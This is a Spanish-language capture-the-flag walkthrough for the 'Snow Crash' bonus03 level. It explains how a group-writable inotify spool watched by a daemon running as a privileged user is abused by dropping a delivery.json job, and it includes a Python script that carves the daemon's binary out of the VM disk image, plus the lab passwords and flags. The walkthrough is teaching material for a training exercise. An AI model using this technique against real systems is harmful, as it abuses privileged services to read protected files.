# Bonus03 - Snow Crash

## Tipo de ejercicio

Explotación de un **daemon inotify** que procesa jobs en un directorio spool
escribible por el grupo del usuario. Al entregar un manifiesto JSON con la
acción correcta, el servicio (como `flagbonus03`) copia la flag a un fichero
legible en `/tmp`.

## Objetivo

Obtener la credencial asociada a `flagbonus03` / al siguiente nivel bonus.

El programa `cic` no es legible ni ejecutable por `bonus03`, pero el servicio
`cic.service` corre como `flagbonus03` y vigila `/var/spool/cic`. Ese directorio
es escribible por el grupo `cic_grp`, al que pertenece `bonus03`.

La pista del home de `bonus03` es:

```text
CIC watches everything. Even the things you think you hid.
```

---

## 1. Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus03@localhost -p 2424
```

La contraseña de `bonus03` es la flag de `bonus02`:

```text
cfiioecfib9aobid1abfa0ci8
```

Comprobar identidad y entorno:

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus03
uid=3003(bonus03) gid=3003(bonus03) groups=3003(bonus03),1001(levelgroup),4010(cic_grp)
/home/bonus03
```

```text
CIC watches everything. Even the things you think you hid.
```

Detalle importante del `id`: el usuario pertenece al grupo **`cic_grp`**
(`4010`). El *spool* es una carpeta donde se dejan trabajos pendientes para
que un programa los procese; aquí, el daemon `cic` vigila `/var/spool/cic`.
Para comprobar que el grupo puede escribir en ese directorio, consulta sus
permisos:

```bash
ls -ld /var/spool/cic
```

La salida documentada es:

```text
drwxrwsr-x  2 flagbonus03 cic_grp 4096 ... cic
```

En `drwxrwsr-x`, los permisos del grupo son `rws`: la `w` permite crear
entradas en el directorio y la `x` permite acceder a él. El grupo propietario
es `cic_grp`, como muestra la columna `cic_grp`; al confirmar con `id` que
`bonus03` pertenece a ese grupo, se deduce que puede escribir en el spool. La
`s` en la posición de ejecución del grupo es el bit **setgid** del directorio:
hace que los archivos nuevos hereden el grupo `cic_grp`.

La cuenta `flagbonus03` existe con shell nologin:

```bash
getent passwd flagbonus03
```

```text
flagbonus03:x:4003:4003::/home/flagbonus03:/usr/sbin/nologin
```

No se inicia sesión interactiva como `flagbonus03`. La flag se obtiene a través
del servicio que corre con sus privilegios.

---

## 2. Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus03
```

Resultado:

```text
/opt/snowcrash/bonus03:
-rwxr-x---  1 flagbonus03 flagbonus03 17056 ... cic
```

El binario `cic`:

- Propietario y grupo: `flagbonus03`
- Modo: `750` (`-rwxr-x---`)

`bonus03` **no** puede ejecutarlo ni leerlo (`Permission denied` en `strings`
y en la ejecución directa).

---

## 3. Identificar el servicio systemd

```bash
systemctl list-units --type=service --all | grep -i cic
systemctl cat cic.service
systemctl status cic.service --no-pager
```

Definición de `/etc/systemd/system/cic.service`:

```ini
[Unit]
Description=Snow Crash bonus03 — CIC inotify spool daemon
After=network.target

[Service]
Type=forking
User=flagbonus03
Group=flagbonus03
ExecStart=/opt/snowcrash/bonus03/cic
Restart=always
RestartSec=5
KillMode=control-group

[Install]
WantedBy=multi-user.target
```

Puntos clave:

- El proceso corre como **`flagbonus03`**.
- Es un **daemon de spool con inotify** (vigila un directorio y reacciona a
  ficheros nuevos).
- No hace falta ejecutar el binario: el servicio ya está `active (running)`.

Comprobación del proceso:

```bash
ps aux | grep -E '[c]ic'
# flagbon+  ...  /opt/snowcrash/bonus03/cic
```

---

## 4. Localizar el directorio spool

```bash
ls -la /var/spool
ls -la /var/spool/cic
```

Resultado:

```text
drwxrwsr-x  2 flagbonus03 cic_grp 4096 ... cic
```

| Elemento | Significado |
|----------|-------------|
| `/var/spool/cic` | Spool vigilado por el daemon |
| `drwxrwsr-x` | Bit setgid (`s` en el grupo): los nuevos ficheros heredan el grupo `cic_grp` |
| Propietario | `flagbonus03` |
| Grupo | `cic_grp` |
| Escritura de grupo | `bonus03` (miembro de `cic_grp`) puede crear ficheros aquí |

El directorio vacío al inicio es normal: el daemon espera **jobs** nuevos.

---

## 5. Por qué no basta con probar a ciegas

Pruebas típicas que **no** disparan la acción correcta:

- Fichero de texto arbitrario (`test_hello`) → permanece sin procesar.
- Symlink a `/home/flagbonus03/.flag` → no se sigue como “report”.
- Script shell en el spool → no se ejecuta.

El daemon solo reacciona a un **nombre y formato de payload** concretos. Como
el binario no es legible en la VM, se obtiene analizándolo **desde el host**.

---

## 6. Extraer el binario desde el VDI (host, sin sudo)

En una terminal del **anfitrión** (no dentro de SSH a la OVA):

En las rutas del ejemplo, `login42` es el nombre de usuario del anfitrión;
sustitúyelo si tu ruta es distinta.

El script Python busca la imagen de disco virtual (`.vdi`) en esas rutas, la
abre en modo de solo lectura y localiza una copia del ejecutable `cic` usando
su ruta y cadenas reconocibles. Extrae los bytes del ELF a `/tmp/cic_bin`.
Después, `file` identifica el archivo y `strings` muestra textos útiles para
analizar qué hace el daemon. Este análisis se realiza en el anfitrión y es
opcional: no hace falta para entregar un job al servicio y obtener la flag.

```bash
python3 << 'EOF'
import mmap, os, sys

candidates = [
    "/home/login42/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
    "/sgoinfre/students/login42/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
]
vdi = next((p for p in candidates if os.path.isfile(p)), None)
if not vdi:
    print("VDI not found")
    sys.exit(1)

# Anclar al path del ejecutable (no solo a /var/spool/cic, que aparece
# también como entrada de directorio en el disco y puede apuntar a otro ELF).
needles = [
    b"/opt/snowcrash/bonus03/cic",
    b"bonus03/cic",
]
out = "/tmp/cic_bin"
size_guess = 17056
max_back = 500_000

with open(vdi, "rb") as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    found = None
    for n in needles:
        pos = 0
        while True:
            pos = mm.find(n, pos)
            if pos < 0:
                break
            start = max(0, pos - max_back)
            elf_rel = mm[start:pos].rfind(b"\x7fELF")
            if elf_rel >= 0:
                elf_off = start + elf_rel
                blob = mm[elf_off:elf_off + size_guess + 8192]
                if b"/var/spool/cic" in blob or b"inotify" in blob:
                    print(f"candidate needle={n!r} pos={pos} elf={elf_off}")
                    open(out, "wb").write(mm[elf_off:elf_off + size_guess])
                    found = elf_off
                    break
            pos += 1
        if found is not None:
            break
    if found is None:
        print("no suitable ELF found")
        sys.exit(1)
    print(f"wrote {size_guess} bytes from {found} -> {out}")
    mm.close()
EOF

file /tmp/cic_bin
strings -a /tmp/cic_bin | grep -iE 'spool|inotify|flag|/var|/tmp|/home|\.flag|cic|delivery|report|action'
```

Resultado esperado de `file`:

```text
/tmp/cic_bin: ELF 64-bit LSB pie executable, x86-64, ... not stripped
```

### Cadenas relevantes del binario

```text
/var/spool/cic
inotify_init1
inotify_add_watch
cic spool monitor active
delivery.json
"action":"report"
"action": "report"
/home/flagbonus03/.flag
/tmp/cic_report
inbound delivery received, dispatching
intelligence record written to staging area
cannot open delivery payload: %s
empty delivery payload, skipping
manifest processed, no action required
```

Interpretación del protocolo:

| Elemento | Valor |
|----------|--------|
| Directorio vigilado | `/var/spool/cic` |
| Nombre del job | **`delivery.json`** |
| Contenido que dispara el report | JSON con **`"action":"report"`** (también acepta espacio tras `:`) |
| Fuente privilegiada | `/home/flagbonus03/.flag` |
| Destino legible | **`/tmp/cic_report`** |

El daemon usa `inotify` para detectar el fichero, lo abre, busca la acción
`report`, lee el `.flag` como `flagbonus03` y escribe el resultado en
`/tmp/cic_report`.

---

## 7. Explotación (dentro de la OVA como `bonus03`)

```bash
# Limpiar restos de pruebas anteriores
rm -f /var/spool/cic/* /tmp/cic_report 2>/dev/null

# Entregar el manifiesto
cat > /var/spool/cic/delivery.json << 'EOF'
{"action":"report"}
EOF

sleep 2
ls -la /tmp/cic_report
cat /tmp/cic_report
```

Salida obtenida:

```text
-rw-r--r-- 1 flagbonus03 flagbonus03 26 ... /tmp/cic_report
mof3b3iud5c3p35bsv9aua0bj
```

Variante equivalente (espacio tras los dos puntos), también válida según las
cadenas del binario:

```bash
echo '{"action": "report"}' > /var/spool/cic/delivery.json
sleep 2
cat /tmp/cic_report
```

### Secuencia

1. `bonus03` crea `/var/spool/cic/delivery.json` (permiso de grupo en el spool).
2. `cic` recibe el evento inotify, clasifica el payload y ve `action: report`.
3. Como `flagbonus03`, lee `/home/flagbonus03/.flag`.
4. Escribe la credencial en `/tmp/cic_report` (legible por todos).

---

## 8. Credencial final

```text
mof3b3iud5c3p35bsv9aua0bj
```

Guardar en el repositorio:

```text
bonus03/flag
```

con una sola línea con esa cadena.

Ese valor se usa como contraseña SSH del siguiente nivel bonus (`bonus04`):

```bash
ssh bonus04@localhost -p 2424
# password: mof3b3iud5c3p35bsv9aua0bj
```

---

## 9. Resumen de comandos válidos

### En la OVA (usuario `bonus03`)

```bash
ssh bonus03@localhost -p 2424
ls -la
cat README
ls -laR /opt/snowcrash/bonus03
systemctl cat cic.service
ls -la /var/spool/cic

echo '{"action":"report"}' > /var/spool/cic/delivery.json
sleep 2
cat /tmp/cic_report
```

### En el host (análisis del binario)

```bash
# Carve del ELF anclado a /opt/snowcrash/bonus03/cic (script sección 6)
python3 ...   # → /tmp/cic_bin
file /tmp/cic_bin
strings -a /tmp/cic_bin | grep -iE 'spool|inotify|delivery|report|flag'
```

---

## 10. Conceptos importantes

- **inotify**: API de Linux para recibir eventos del sistema de archivos
  (creación, cierre de escritura, etc.) sin hacer polling continuo.
- **Spool escribible por grupo**: el daemon corre como usuario privilegiado
  (`flagbonus03`) pero el directorio de entrada es usable por `cic_grp`. Es un
  patrón habitual (y peligroso si el formato del job no está bien acotado).
- **Setgid en el directorio (`rws`)**: los ficheros nuevos heredan el grupo
  `cic_grp`, manteniendo la colaboración del grupo sobre el spool.
- **Manifiesto JSON como trigger**: no se ejecuta código arbitrario del
  usuario; se evalúa un campo `action`. La acción `report` es la que provoca
  la lectura del `.flag` y la escritura en `/tmp/cic_report`.
- **Reverse engineering offline**: cuando el ELF no es legible en la VM, se
  recupera del VDI en el host. Es importante anclar la búsqueda a una cadena
  **única del binario** (p. ej. `/opt/snowcrash/bonus03/cic`), no solo a rutas
  de directorio que también existen en el sistema de archivos del disco.

---

## 11. Conclusión

No se modifica ningún archivo permanente de la OVA más allá de dejar un job
temporal en el spool. La solución consiste en:

1. Identificar `cic.service` y el spool `/var/spool/cic`.
2. Confirmar que `bonus03` puede escribir en el spool (`cic_grp`).
3. Descubrir el formato del job (`delivery.json` + `"action":"report"`)
   analizando el binario desde el host.
4. Leer la flag en `/tmp/cic_report`.

Credencial obtenida:

```text
mof3b3iud5c3p35bsv9aua0bj
```

---

## 12. Estructura recomendada en el repositorio

```text
bonus03/
├── flag                          # mof3b3iud5c3p35bsv9aua0bj
└── resources/
    └── bonus03.md                # este documento
```

Según la convención del repo `42_snow-crash`, la guía detallada vive en
`bonus03/resources/bonus03.md` y el token en `bonus03/flag`.
```
